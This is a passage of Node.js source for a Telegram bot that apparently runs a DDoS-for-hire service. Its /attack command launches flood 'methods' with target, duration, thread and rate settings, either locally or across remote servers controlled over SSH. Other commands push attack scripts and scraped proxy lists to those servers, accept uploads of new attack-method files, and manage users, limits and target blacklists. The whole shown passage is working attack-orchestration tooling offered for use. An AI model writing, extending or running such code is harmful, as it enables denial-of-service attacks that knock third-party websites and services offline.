        const local = path.join(CONFIG.SCRIPT_DIR, f);
        if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
      }
      const proxyLocal = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
      if (fs.existsSync(proxyLocal)) {
        await sshUpload(conn, proxyLocal, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
      }
      upsertServer({ id: s.id, status: 'online', lastCheck: Date.now() });
      ok++;
      await editMsg(msg.chat.id, statusMsg.message_id, `🔄 Synced ${ok} ok / ${fail} fail (of ${servers.length})`);
    } catch {
      upsertServer({ id: s.id, status: 'offline', lastCheck: Date.now() });
      fail++;
    }
  }

  await editMsg(msg.chat.id, statusMsg.message_id, `✅ Sync done: ${ok} ok, ${fail} failed`);
});

/* ───── /attack ───── */

cmd('attack', async (msg, args) => {
  const user = ensureUserExists(msg);

  if (user.role === 'pending') return reply(msg, '⏳ Account pending approval.');
  if (user.role === 'banned') return reply(msg, '🚫 You are banned.');

  // Parse target spec from tail
  let targetSpec = 'local';
  if (args.length && args[args.length - 1].startsWith('@')) {
    targetSpec = args.pop().slice(1);
  }

  const methodId = args[0];
  if (!methodId) return reply(msg, 'Usage: `/attack <method> <args...> [@local|@all|@srv_xxx]`');

  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method \`${methodId}\``);

  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) {
    return reply(msg, `❌ Method file missing: ${method.file}`);
  }

  // Cooldown
  const cd = cooldowns.get(msg.from.id);
  if (cd && cd.until > Date.now()) {
    const left = Math.ceil((cd.until - Date.now()) / 1000);
    return reply(msg, `⏳ Cooldown — *${left}s* left.`);
  }

  // Concurrency
  const limit = user.limits?.maxConcurrent || 0;
  if (limit > 0 && userActiveSessions(msg.from.id) >= limit) {
    return reply(msg, `❌ Max concurrent sessions (${limit}) reached.`);
  }

  // Parse args
  let parsed;
  try {
    parsed = method.parse(args.slice(1));
    if (!parsed.target || !parsed.duration || !parsed.threads || !parsed.rate) {
      return reply(msg, `❌ Missing args.\nUsage: \`${method.example}\``);
    }
    const t = validateTarget(parsed.target);
    if (isBlacklisted(t.host)) return reply(msg, `🚫 \`${esc(t.host)}\` is blacklisted.`);
    checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
  } catch (e) {
    return reply(msg, `❌ ${e.message}`);
  }

  // Resolve target spec
  let serversToUse = [];
  let useLocal = false;

  if (targetSpec === 'local') {
    useLocal = true;
  } else if (targetSpec === 'all') {
    useLocal = true;
    serversToUse = loadServers().filter(s => s.status === 'online');
  } else {
    const ids = targetSpec.split(',').map(s => s.trim()).filter(Boolean);
    for (const sid of ids) {
      const s = getServer(sid);
      if (!s) return reply(msg, `❌ Server not found: \`${sid}\``);
      if (s.status !== 'online') return reply(msg, `⚠️ Server \`${sid}\` is ${s.status}. Run /servercheck first.`);
      serversToUse.push(s);
    }
  }

  if (!useLocal && serversToUse.length === 0) {
    return reply(msg, '❌ No attack target — nothing to launch.');
  }

  const launched = [];

  // Launch local
  if (useLocal) {
    try {
      const session = launchLocal(user, method, parsed.args);
      launched.push({ session, where: 'local' });
    } catch (e) {
      launched.push({ error: 'local: ' + e.message });
    }
  }

  // Launch remote(s)
  for (const s of serversToUse) {
    try {
      const session = await launchRemote(user, method, parsed.args, s.id);
      launched.push({ session, where: s.name });
    } catch (e) {
      launched.push({ error: `${s.name}: ${e.message}` });
    }
  }

  // Set cooldown
  if (user.limits && user.limits.cooldown > 0) {
    cooldowns.set(user.telegramId, { until: Date.now() + user.limits.cooldown * 1000 });
  }

  audit('attack_launched', msg.from.id, {
    method: method.id, target: parsed.target, spec: targetSpec,
    local: useLocal, servers: serversToUse.map(s => s.id),
  });

  // Report
  const lines = [`🚀 *Attack dispatched*`, ''];
  lines.push(`Method: *${method.name}*`);
  lines.push(`Target: \`${esc(parsed.target)}\``);
  lines.push(`Duration: ${parsed.duration}s · Threads ${parsed.threads} · Rate ${parsed.rate}`);
  lines.push('');

  for (const l of launched) {
    if (l.error) lines.push(`❌ ${esc(l.error)}`);
    else {
      const icon = l.session.where === 'local' ? '💻' : '🌐';
      lines.push(`${icon} \`${l.session.id}\` — ${l.session.where === 'local' ? 'LOCAL' : l.session.serverName}`);
    }
  }

  lines.push('');
  lines.push('Stop: `/stop <session_id>`');
  await reply(msg, lines.join('\n'));
});

/* ───── /status ───── */

cmd('status', async (msg) => {
  const user = ensureUserExists(msg);
  const mine = [...sessions.values()].filter(s => s.owner === msg.from.id && s.status === 'running');

  if (mine.length === 0) return reply(msg, '📭 No active sessions.');

  const txt = ['*Your active sessions:*', ''];
  mine.forEach(s => {
    const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
    const icon = s.where === 'local' ? '💻' : '🌐';
    txt.push(`${icon} \`${s.id}\` — *${s.methodName}*`);
    txt.push(`  ${esc(s.target)}`);
    txt.push(`  ${elapsed}s/${s.duration}s · ${s.where === 'local' ? 'LOCAL' : s.serverName}`);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

/* ───── /stop ───── */

cmd('stop', async (msg, args) => {
  const user = ensureUserExists(msg);
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/stop <session_id>`');

  const s = sessions.get(id);
  if (!s) return reply(msg, '❌ Session not found.');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not your session.');

  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped \`${id}\``);
});

/* ───── /scrape ───── */

cmd('scrape', async (msg) => {
  const user = ensureUserExists(msg);
  if (!isAdmin(msg.from.id) && user.role !== 'user') return reply(msg, '❌ Permission denied.');
  await reply(msg, '🔄 Scraping proxies...');
  try {
    const count = await scrapeProxies();
    await reply(msg, `✅ *${count}* proxies → \`${CONFIG.PROXY_FILE}\`\n\n_Don\'t forget /syncall to push to servers._`);
  } catch (e) {
    await reply(msg, `❌ ${e.message}`);
  }
});

/* ══════════════════════════ ADMIN: USERS ══════════════════════════ */

cmd('users', async (msg) => {
  if (!adminOnly(msg)) return;
  const list = Object.values(loadUsers());
  if (!list.length) return reply(msg, '_No users._');
  const txt = [`*Users (${list.length}):*`, ''];
  list.forEach(u => {
    const l = u.limits || {};
    const icon = u.role === 'admin' ? '👑' : u.role === 'user' ? '✅' : u.role === 'banned' ? '🚫' : '⏳';
    txt.push(`${icon} \`${u.telegramId}\` ${esc(u.firstName || u.username || '')}`);
    txt.push(`  role=${u.role} dur=${l.maxDuration || '∞'} th=${l.maxThreads || '∞'} rate=${l.maxRate || '∞'} cd=${l.cooldown || 0}s`);
  });
  await reply(msg, txt.join('\n'));
});

cmd('approve', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/approve <id>`');
  if (!getUser(id)) return reply(msg, '❌ User not found.');
  upsertUser(id, { role: 'user' });
  audit('user_approved', msg.from.id, { target: id });
  await reply(msg, `✅ \`${id}\` approved.`);
});

cmd('ban', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/ban <id>`');
  if (isAdmin(id)) return reply(msg, '❌ Cannot ban admin.');
  if (!getUser(id)) return reply(msg, '❌ Not found.');
  upsertUser(id, { role: 'banned' });
  audit('user_banned', msg.from.id, { target: id });
  await reply(msg, `🚫 \`${id}\` banned.`);
});

cmd('adduser', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/adduser <id>`');
  if (getUser(id)) return reply(msg, '⚠️ Exists.');
  upsertUser(id, {
    telegramId: id, role: 'user', createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
  await reply(msg, `✅ \`${id}\` created.`);
});

cmd('setlimit', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const [idStr, field, valStr] = args;
  const id = Number(idStr), value = Number(valStr);
  if (!id || !field || isNaN(value)) {
    return reply(msg, 'Usage: `/setlimit <id> <maxDuration|maxThreads|maxRate|maxConcurrent|cooldown> <value>`');
  }
  if (!['maxDuration', 'maxThreads', 'maxRate', 'maxConcurrent', 'cooldown'].includes(field)) {
    return reply(msg, '❌ Invalid field.');
  }
  const u = getUser(id);
  if (!u) return reply(msg, '❌ Not found.');
  upsertUser(id, { limits: { ...(u.limits || {}), [field]: value } });
  await reply(msg, `✅ \`${id}\` ${field}=${value}`);
});

/* ══════════════════════════ ADMIN: BLACKLIST ══════════════════════════ */

cmd('blacklist', async (msg) => {
  if (!adminOnly(msg)) return;
  const l = loadBlacklist();
  if (!l.length) return reply(msg, '_Empty._');
  await reply(msg, '*Blacklisted:*\n' + l.map(h => `• \`${esc(h)}\``).join('\n'));
});

cmd('black', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const host = normalizeHost(args[0]);
  if (!host) return reply(msg, 'Usage: `/black <host>`');
  const l = loadBlacklist();
  if (l.includes(host)) return reply(msg, '⚠️ Already.');
  l.push(host); saveBlacklist(l);
  await reply(msg, `✅ Blacklisted \`${esc(host)}\``);
});

cmd('unblack', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const host = normalizeHost(args[0]);
  const l = loadBlacklist();
  const i = l.indexOf(host);
  if (i < 0) return reply(msg, '❌ Not found.');
  l.splice(i, 1); saveBlacklist(l);
  await reply(msg, `✅ Removed \`${esc(host)}\``);
});

/* ══════════════════════════ ADMIN: STATS ══════════════════════════ */

cmd('stats', async (msg) => {
  if (!adminOnly(msg)) return;
  const users = loadUsers();
  const total = Object.keys(users).length;
  const admins = Object.values(users).filter(u => u.role === 'admin').length;
  const pending = Object.values(users).filter(u => u.role === 'pending').length;
  const servers = loadServers();
  const online = servers.filter(s => s.status === 'online').length;
  const active = [...sessions.values()].filter(s => s.status === 'running').length;
  const local = [...sessions.values()].filter(s => s.status === 'running' && s.where === 'local').length;
  const remote = active - local;

  await reply(msg, [
    '*Global stats*',
    `Users: *${total}* (${admins} admins, ${pending} pending)`,
    `Servers: *${online}/${servers.length}* online`,
    `Active sessions: *${active}* (💻${local} local / 🌐${remote} remote)`,
    `Blacklist: ${loadBlacklist().length}`,
    `Proxy file: ${fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE)) ? '✅' : '❌'}`,
    `Methods: ${availableMethods().length} available`,
  ].join('\n'));
});

/* ───── /cancel ───── */

cmd('cancel', async (msg) => {
  pendingInput.delete(msg.from.id);
  await reply(msg, '❎ Cancelled.');
});

/* ══════════════════════════ MESSAGE ROUTER ══════════════════════════ */

bot.on('message', async (msg) => {
  // Document upload (for /uploadmethod)
  if (msg.document) {
    const p = pendingInput.get(msg.from.id);
    if (!p || p.action !== 'await_method_file') return;

    if (p.expires && Date.now() > p.expires) {
      pendingInput.delete(msg.from.id);
      return reply(msg, '⏰ Upload window expired.');
    }

    const fileName = msg.document.file_name || 'method.js';
    if (!fileName.endsWith('.js')) {
      return reply(msg, '❌ Must be a .js file.');
    }

    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const targetPath = path.join(CONFIG.SCRIPT_DIR, fileName);
      const r = await axios.get(link, { responseType: 'stream', timeout: 30000 });
      await new Promise((resolve, reject) => {
        const w = fs.createWriteStream(targetPath);
        r.data.pipe(w);
        w.on('finish', resolve);
        w.on('error', reject);
      });
      pendingInput.delete(msg.from.id);
      audit('method_uploaded', msg.from.id, { file: fileName });

      await reply(msg, [
        `✅ Uploaded: \`${fileName}\``,
        '',
        `Now register it:`,
        `\`/addmethod <id> <name> ${fileName} "$1 $2 $3 $4"\``,
      ].join('\n'));
    } catch (e) {
      await reply(msg, `❌ Upload failed: ${e.message}`);
    }
    return;
  }

  if (!msg.text) return;
  const text = msg.text.trim();

  // Handle pending interactive flows
  const pending = pendingInput.get(msg.from.id);
  if (pending && (!pending.expires || Date.now() < pending.expires)) {
    await handlePending(msg, pending, text);
    return;
  }

  if (!text.startsWith('/')) return;

  const parts = text.slice(1).split(/\s+/);
  const cmdName = parts[0].split('@')[0].toLowerCase();
  const args = parts.slice(1);

  const handler = COMMANDS.get(cmdName);
  if (!handler) return;

  try { await handler(msg, args); }
  catch (e) {
    console.error(`[cmd ${cmdName}]`, e);
    try { await reply(msg, `❌ Error: ${e.message}`); } catch {}
  }
});

/* ══════════════════════════ INTERACTIVE FLOWS ══════════════════════════ */

async function handlePending(msg, pending, text) {
  if (text === '/cancel') {
    pendingInput.delete(msg.from.id);
    return reply(msg, '❎ Cancelled.');
  }

  const data = pending.data || {};

  try {
    switch (pending.action) {
      case 'addserver_addr': {
        if (!/^[\w.-]+:\d+$/.test(text)) {
          return reply(msg, '❌ Invalid format. Send `ip:port` e.g. `77.237.244.35:22`');
        }
        data.addr = text;
        pending.action = 'addserver_user';
        pendingInput.set(msg.from.id, pending);
        return reply(msg, '👤 Send SSH username (e.g. `root`)');
      }
      case 'addserver_user': {
        data.username = text;
        pending.action = 'addserver_pass';
        pendingInput.set(msg.from.id, pending);
        return reply(msg, '🔑 Send SSH password\n\n_Message will be deleted after reading for security._');
      }
      case 'addserver_pass': {
        data.password = text;
        pending.action = 'addserver_name';
        pendingInput.set(msg.from.id, pending);

        // Delete password message
        try { await bot.deleteMessage(msg.chat.id, msg.message_id); } catch {}

        return reply(msg, '🏷 Send a short name for this server (or `/skip` for host)');
      }
      case 'addserver_name': {
        const name = text === '/skip' ? data.addr.split(':')[0] : text;
        pendingInput.delete(msg.from.id);
        return addServerFlow(msg, data.addr, data.username, data.password, name);
      }
    }
  } catch (e) {
    pendingInput.delete(msg.from.id);
    await reply(msg, `❌ Flow error: ${e.message}`);
  }
}

/* ══════════════════════════ STARTUP ══════════════════════════ */

(async () => {
  console.log('[bot] starting...');
  console.log('[bot] script dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] admins:', CONFIG.ADMIN_IDS);
  console.log('[bot] methods:', availableMethods().map(m => m.id).join(', ') || '(none)');
  console.log('[bot] servers:', loadServers().length);

  for (const id of CONFIG.ADMIN_IDS) {
    if (!getUser(id)) {
      upsertUser(id, {
        telegramId: id, role: 'admin', createdAt: new Date().toISOString(),
        limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
      });
      console.log(`[bot] bootstrapped admin ${id}`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] connected as @${me.username}`);
  } catch (e) {
    console.error('[bot] getMe failed:', e.message);
  }

  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE))) {
    console.log('[bot] scraping proxies...');
    try {
      const n = await scrapeProxies();
      console.log(`[bot] scraped ${n} proxies`);
    } catch (e) { console.error('[bot] scrape failed:', e.message); }
  }
})();

process.on('SIGINT', () => { console.log('\n[bot] bye'); process.exit(0); });
process.on('SIGTERM', () => { console.log('\n[bot] bye'); process.exit(0); });